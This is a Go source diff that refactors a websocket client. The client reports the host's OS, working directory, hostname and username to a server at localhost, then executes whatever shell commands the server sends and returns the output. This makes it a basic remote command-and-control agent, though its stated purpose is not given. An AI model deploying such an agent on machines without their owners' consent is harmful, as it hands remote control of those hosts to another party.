@@ -2,7 +2,6 @@ package main
 
 import (
 	"encoding/json"
-	"fmt"
 	"github.com/gorilla/websocket"
 	"log"
 	"os"
@@ -14,9 +13,10 @@ import (
 )
 
 type CommandResult struct {
+	HostInfo map[string]string
 	Command string
 	Result  string
-	Err     error
+	Err     string
 }
 
 func send(c *websocket.Conn, msg []byte) {
@@ -36,19 +36,22 @@ func commandHandler(c *websocket.Conn, cmd string) {
 	log.Println("recieved command:", cmd)
 	command := strings.Split(cmd, " ")
 	out, err := exec.Command(command[0], command[1:]...).Output()
+	retError := ""
 	if err != nil {
 		log.Println(err)
+		retError = err.Error()
 	}
 	cr := &CommandResult{
+		HostInfo: hostInfo,
 		Command: cmd,
 		Result:  string(out),
-		Err:     err,
+		Err:    retError, 
 	}
 	msg, _ := json.Marshal(cr)
 	send(c, msg)
 }
 
-func getHostInfo() string {
+func getHostInfo() map[string]string {
 	pwd, err := os.Getwd()
 	if err != nil {
 		pwd = ""
@@ -58,8 +61,16 @@ func getHostInfo() string {
 		pwd = ""
 	}
 	user, err := user.Current()
-	return fmt.Sprintf("%s %s %s %s", runtime.GOOS, pwd, hostname, user.Username)
+	
+	info := make(map[string]string)
+	info["os"] = runtime.GOOS
+	info["working_dir"] = pwd
+	info["hostname"] = hostname
+	info["username"] = user.Username
+	return info
 }
+
+var hostInfo = getHostInfo()
 
 func main() {
 	host := "ws://localhost:8000"
@@ -72,7 +83,14 @@ func main() {
 	defer conn.Close()
 
 	// get the initial host info and send it as the first message
-	send(conn, []byte(getHostInfo()))
+	cr := &CommandResult{
+		HostInfo: hostInfo,
+		Command: "connect",
+		Result:  "hello",
+		Err:     "",
+	}
+	msg,_ := json.Marshal(cr)
+	send(conn, msg)
 	// after that, wait for commands and respond to them
 	for {
 		msg, err := recieve(conn)
